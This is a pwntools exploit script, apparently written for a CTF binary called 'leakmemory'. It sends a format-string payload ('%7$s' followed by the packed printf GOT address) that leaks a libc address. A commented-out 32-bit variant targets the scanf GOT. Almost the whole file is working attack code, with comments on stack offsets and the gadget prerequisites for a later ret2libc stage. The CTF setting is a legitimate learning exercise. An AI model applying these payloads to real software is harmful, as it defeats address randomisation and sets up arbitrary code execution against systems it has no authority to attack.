#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found
from pwn import *
context.log_level = 'debug'

p = process('./leakmemory')
#p = remote('pwn2.jarvisoj.com',9881)

elf = ELF('./leakmemory')

#scanf would ignore 0x20 0xa, so could not use scanf_got: 601020 <__isoc99_scanf@GLIBC_2.7>
printf_got = elf.got['printf']
print 'printf_got= ' + hex(printf_got)

#%p%p%p%p%p%p%p%paaaaaaaa
#00000001.22222222.ffffffff.%p%p%p%p%p%p%p%paaaaaaaa
#0x18cb420 rsi 0x7fc925d12760 rdx 0x7fffffcc rcx 0x7ffc715d4ac0 r8 0x34 r9 0x70257025702570250x70257025702570250x6161616161616161aaaaaaaa
#means the input string is at the top of the stack, the 6th argument, add '%7$s,,,' makes the 7th
payload = "%7$s,,,," + p64(printf_got)
with open("leakmemory.input", "w") as f:
    f.write(payload)
gdb.attach(p)
p.sendline(payload)

p.recvuntil('\n')
# printf truncate after '\0', if there is \0 inside the got, need to run multiple times until no \0
data = p.recvuntil('\x7f')
print data

printf_addr = u64(data + '\x00\x00')
print 'printf_addr= ' + hex(printf_addr)



'''32bit
from pwn import *
context.log_level = 'debug'
sh = process('./leakmemory.32bit')
leakmemory = ELF('./leakmemory.32bit')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
#gdb.attach(sh)
sh.sendline(payload)
#80484c2:	83 ec 0c sub $0xc,%esp    top of stack move 12 bytes = 3 * 4, so string is the 4th argument
#80484ce:	83 c4 10 add $0x10,%esp  (to make each time add 0x10 or 0x20...)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got
sh.interactive()
'''